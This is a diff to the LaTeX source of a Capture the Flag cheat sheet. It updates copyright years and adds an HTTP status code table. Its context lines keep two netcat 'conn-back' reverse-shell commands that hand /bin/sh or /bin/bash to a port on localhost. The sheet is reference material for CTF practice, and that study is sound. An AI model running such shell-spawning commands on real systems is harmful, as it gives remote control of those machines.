@@ -1,6 +1,6 @@
 %% ctf-cs.tex
 %
-% Copyright 2014, 2015  Rudy Matela
+% Copyright 2014-2020  Rudy Matela
 %
 % This text is available under (at your option):
 %   * Creative Commons Attribution-ShareAlike 3.0 Licence
@@ -16,7 +16,7 @@
 \title{Concise Capture the Flag Cheat Sheet}
 
 \cright{
-	Copyright 2014-2019, Rudy Matela --
+	Copyright 2014-2020, Rudy Matela --
 	Compiled on \today{} \\
 	Upstream: \texttt{https://github.com/rudymatela/concise-cheat-sheets}
 }{
@@ -292,6 +292,45 @@
 	\li[Netcat conn-back]    \$ netcat -e /bin/sh localhost 1337
 	\li[\ \ (colored)]       \$ nc -e "/bin/bash -i" localhost 1337
 \end{ldesc}
+
+\subsection{HTTP Status Codes}
+
+\begin{tabular}{l@{ }l}
+	\li[1xx] Informational
+	\li[100] Continue
+	\\
+	\li[2xx] Success
+	\li[200] OK
+	\li[201] Created
+	\li[202] Accepted
+	\li[204] No Content
+	\li[206] Partial Content
+	\\
+	\li[3xx] Redirection
+	\li[300] Multiple Choices
+	\li[301] Moved Permanently
+	\li[302] Found
+	\li[303] See Other
+	\li[304] Not Modified
+\end{tabular}
+\begin{tabular}{l@{ }l}
+	\li[4xx] Client Errors
+	\li[400] Bad Request
+	\li[401] Unauthorized
+	\li[403] Forbidden
+	\li[404] Not Found
+	\li[405] Method Not Allowed
+	\li[406] Not Acceptable
+	\li[409] Conflict
+	\li[413] Payload Too Large
+	\li[422] Unprocessable Entity
+	\li[429] Too Many Requests
+	\\
+	\li[5xx] Server errors
+	\li[500] Internal Server Error
+	\li[502] Bad Gateway
+	\li[504] Gateway Timeout
+\end{tabular}
 
 \pagebreak
 
